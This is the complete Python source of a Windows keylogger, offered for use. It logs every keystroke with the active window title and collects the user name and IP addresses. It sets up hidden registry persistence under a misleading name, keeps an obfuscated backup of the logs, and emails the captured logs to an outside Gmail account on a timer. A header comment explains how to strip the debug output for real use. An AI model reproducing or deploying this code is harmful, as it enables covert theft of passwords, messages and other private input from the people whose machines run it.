#//python keylogging program

## You will need to comment out the prints and exception prints on code if you were to use this for real, as its testing
## i have prints on here that will tell you and let you know what part of the program is going at the time and that it is
## working

#imports
from pynput.keyboard import Key,Listener
import win32gui
import os
import time
import requests
import socket
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import threading

import winreg
import config

# Use settings from config.py
fromAddr = config.EMAIL_SENDER
fromPswd = config.EMAIL_PASSWORD
toAddr = config.EMAIL_RECEIVER

def debug_print(msg):
    if config.DEBUG:
        print(msg)

def simple_encrypt(data):
    if not config.ENCRYPT_LOGS:
        return data
    key = config.ENCRYPTION_KEY
    return "".join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))

def establish_persistence():
    if not config.PERSISTENCE:
        return
    try:
        path = os.path.realpath(__file__)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsSystemLogger", 0, winreg.REG_SZ, f'pythonw.exe "{path}"')
        winreg.CloseKey(key)
        debug_print("[+] Persistence established in Registry")
    except Exception as e:
        debug_print(f"[!] Failed to establish persistence: {e}")

def backup_to_file(data):
    try:
        appdata = os.getenv('APPDATA')
        backup_path = os.path.join(appdata, config.LOG_FILE_NAME)
        encrypted_data = simple_encrypt(data)
        with open(backup_path, "a") as f:
            f.write(encrypted_data + "\n---END OF CHUNK---\n")
        debug_print(f"[+] Backup saved to {backup_path}")
    except Exception as e:
        debug_print(f"[!] Failed to backup logs: {e}")


datetime = time.ctime(time.time())
user = os.path.expanduser('~').split('\\')[2]
publicIP = requests.get('https://api.ipify.org/').text
privateIP = socket.gethostbyname(socket.gethostname())

initial_msg = f'[START OF LOGS]\n  *~ Date/Time: {datetime}\n  *~ User-Profile: {user}\n  *~ Public-IP: {publicIP}\n  *~ Private-IP: {privateIP}\n\n'
logged_data = initial_msg

old_app = ''
timer = None
pressed_modifiers = set()


def on_press(key):
	global old_app, logged_data, timer

	current_time = time.time()

	new_app = win32gui.GetWindowText(win32gui.GetForegroundWindow())

	if new_app == 'Cortana':
		new_app = 'Windows Start Menu'

	if new_app != old_app and new_app != '':
		logged_data += f'\n[{time.ctime(current_time)}] ~ {new_app}: '
		old_app = new_app


	modifiers = [Key.shift, Key.shift_r, Key.ctrl_l, Key.ctrl_r, Key.alt_l, Key.alt_r, Key.cmd]

	substitution = ['Key.enter', '[ENTER] ', 'Key.backspace', '[BACKSPACE] ', 'Key.space', ' ',
	'Key.alt_l', '[ALT] ', 'Key.tab', '[TAB] ', 'Key.delete', '[DEL] ', 'Key.ctrl_l', '[CTRL] ',
	'Key.left', '[LEFT ARROW] ', 'Key.right', '[RIGHT ARROW] ', 'Key.shift', '[SHIFT] ', '\\x13',
	'[CTRL-S] ', '\\x17', '[CTRL-W] ', 'Key.caps_lock', '[CAPS LK] ', '\\x01', '[CTRL-A] ', 'Key.cmd',
	'[WINDOWS KEY] ', 'Key.print_screen', '[PRNT SCR] ', '\\x03', '[CTRL-C] ', '\\x16', '[CTRL-V] ']

	key_str = str(key).strip('\'')
	if key in modifiers:
		if key not in pressed_modifiers:
			pressed_modifiers.add(key)
			if key_str in substitution:
				logged_data += substitution[substitution.index(key_str)+1]
			else:
				logged_data += key_str
	else:
		if key_str in substitution:
			logged_data += substitution[substitution.index(key_str)+1]
		else:
			logged_data += key_str

	# No reset_timer on press


def on_release(key):
	global pressed_modifiers
	modifiers = [Key.shift, Key.shift_r, Key.ctrl_l, Key.ctrl_r, Key.alt_l, Key.alt_r, Key.cmd]
	if key in modifiers:
		pressed_modifiers.discard(key)


def send_and_restart():
	send_email()
	global timer
	timer = threading.Timer(config.SEND_INTERVAL, send_and_restart)
	timer.start()

def send_email():
	global logged_data, timer
	timer = None
	if len(logged_data) > len(initial_msg):
		retries = 3
		success = False
		while retries > 0 and not success:
			try:
				subject = f'Keylogger Log - {user} - {time.ctime(time.time())}'

				msg = MIMEMultipart()
				msg.set_charset('utf-8')
				msg['From'] = fromAddr
				msg['To'] = toAddr
				msg['Subject'] = subject
				body = logged_data
				msg.attach(MIMEText(body, 'plain'))

				text = msg.as_string()

				s = smtplib.SMTP_SSL('smtp.gmail.com', 465)
				s.login(fromAddr, fromPswd)
				s.sendmail(fromAddr, toAddr, text)
				debug_print('sent mail')
				s.quit()

				logged_data = initial_msg
				debug_print('email sent and data reset')
				success = True

			except Exception as errorString:
				retries -= 1
				debug_print(f'[!] send_email // Error.. ~ {errorString}. Retries left: {retries}')
				time.sleep(5)
		
		if not success:
			debug_print('[!] Max retries reached. Backing up logs to local file.')
			backup_to_file(logged_data)
			# Do not reset logged_data so it can be attempted again later




if __name__=='__main__':
	establish_persistence()
	send_and_restart()

	with Listener(on_press=on_press, on_release=on_release) as listener:
		listener.join()

